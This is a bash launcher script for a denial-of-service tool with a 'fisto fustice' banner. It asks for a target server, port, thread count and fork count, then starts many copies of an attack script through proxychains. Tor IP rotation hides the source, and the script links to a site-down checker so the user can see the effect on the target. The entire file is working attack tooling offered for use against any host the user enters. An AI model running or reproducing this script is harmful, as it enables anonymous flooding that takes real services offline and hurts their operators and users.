#!/bin/bash 
#Author Tim Schughart
touch ./log/pattern.log
echo "" > ./log/pattern.log

main/multi-tor.sh 20 > /dev/null & 

echo -e "
  __ _     _         __ _           _   _                     
 / _(_)___| |_ ___  / _(_)_   _ ___| |_(_) ___ ___  
| |_| / __| __/ _ \| |_| | | | / __| __| |/ __/ _ \ 
|  _| \__ \ || (_) |  _| | |_| \__ \ |_| | (_|  __/ 
|_| |_|___/\__\___/|_|_/ |\__,_|___/\__|_|\___\___| 
                     |__/                              
"
echo -n "Please enter target server:" 
read target
echo -n "Please enter target Port:" 
read port 
echo -n "Please insert number of Threads:" 
read threads
echo -n "Please enter fork count:"
read forks

start=1
#connections=$(($forks * $threads))

for i in $(eval echo "{$start..$forks}")
	do 
		proxychains ./main/fist-main.py -t $target -p $port -r $threads >> ./log/pattern.log &
done 

echo -e "Attacking $target with $threads threads with $forks forks which are $connections connections" 
echo -e "Check logfiles for more details"
echo -e "tail -f ./log/pattern.log"
echo -e "Check Website functionality: http://www.downforeveryoneorjustme.com/$target"
echo -e "Please press any key to stop attack" 

./main/tor-ip-switcher.sh > /dev/null &

read tmp

killall fist-main.py > /dev/null &
killall tor-ip-switcher.sh > /dev/null &
killall tor > /dev/null &
